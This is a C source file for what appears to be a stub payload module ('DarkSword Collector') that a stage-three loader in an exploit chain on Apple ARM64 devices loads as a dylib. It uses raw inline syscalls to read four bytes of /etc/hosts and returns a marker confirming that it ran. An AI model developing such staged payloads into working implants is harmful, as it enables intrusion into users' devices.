/**
 * DarkSword Collector v53 - exports _process (like bootstrap)
 * Simple file read via raw BSD syscalls
 * Must export: _process AND _ds_start
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6

/* Entry point - Stage3 calls _process */
void _process(void) {
    /* Read /etc/hosts first 4 bytes and store in a known location */
    long fd = _svc1(SYS_open, (long)"/etc/hosts");
    if (fd < 0) return;
    char buf[4] = {0};
    _svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);
}

/* Also export _ds_start for compatibility */
int _ds_start(void) {
    _process();
    return 0x56781234; /* marker: dylib executed successfully */
}
